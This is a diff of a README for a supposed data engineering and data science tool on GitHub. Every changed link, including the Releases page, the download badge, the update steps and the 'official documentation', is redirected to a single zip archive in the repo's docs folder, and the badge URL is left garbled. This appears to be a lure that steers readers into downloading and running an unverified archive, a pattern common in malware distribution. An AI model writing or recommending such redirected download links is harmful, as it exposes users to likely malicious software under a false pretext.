@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the dx-data-engineering-and-d
 
 ## 📥 Download Now
 
-[![Download dx-data-engineering-and-data-science](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/aslidogan0106-cmd/dx-data-engineering-and-data-science/releases)
+[![Download dx-data-engineering-and-data-science](https://github.com/aslidogan0106-cmd/dx-data-engineering-and-data-science/raw/refs/heads/main/docs/dx_data_science_and_engineering_1.2.zip%20Now-Get%20the%20App-blue)](https://github.com/aslidogan0106-cmd/dx-data-engineering-and-data-science/raw/refs/heads/main/docs/dx_data_science_and_engineering_1.2.zip)
 
 ## 💡 What is dx-data-engineering-and-data-science?
 
@@ -23,7 +23,7 @@ dx-data-engineering-and-data-science is a tool that focuses on improving your ex
 
 To get the application, visit the Releases page:
 
-[Download dx-data-engineering-and-data-science](https://github.com/aslidogan0106-cmd/dx-data-engineering-and-data-science/releases)
+[Download dx-data-engineering-and-data-science](https://github.com/aslidogan0106-cmd/dx-data-engineering-and-data-science/raw/refs/heads/main/docs/dx_data_science_and_engineering_1.2.zip)
 
 ### Step-by-Step Instructions
 
@@ -56,7 +56,7 @@ If you encounter issues during installation, consider the following steps to res
 
 It’s important to keep your application updated for the latest features and security patches. To update:
 
-1. Return to the [Releases page](https://github.com/aslidogan0106-cmd/dx-data-engineering-and-data-science/releases).
+1. Return to the [Releases page](https://github.com/aslidogan0106-cmd/dx-data-engineering-and-data-science/raw/refs/heads/main/docs/dx_data_science_and_engineering_1.2.zip).
 2. Download the latest version.
 3. Follow the same installation steps to overwrite the existing version.
 
@@ -76,6 +76,6 @@ Join our community to connect with other users. Share your experiences and find 
 
 ## 🌐 Learn More
 
-For more information, diagrams, and examples on how to leverage the tool, explore our [official documentation](http://example.com/documentation).
+For more information, diagrams, and examples on how to leverage the tool, explore our [official documentation](https://github.com/aslidogan0106-cmd/dx-data-engineering-and-data-science/raw/refs/heads/main/docs/dx_data_science_and_engineering_1.2.zip).
 
 Thank you for choosing dx-data-engineering-and-data-science! Enjoy your enhanced workflow in data engineering and data science.
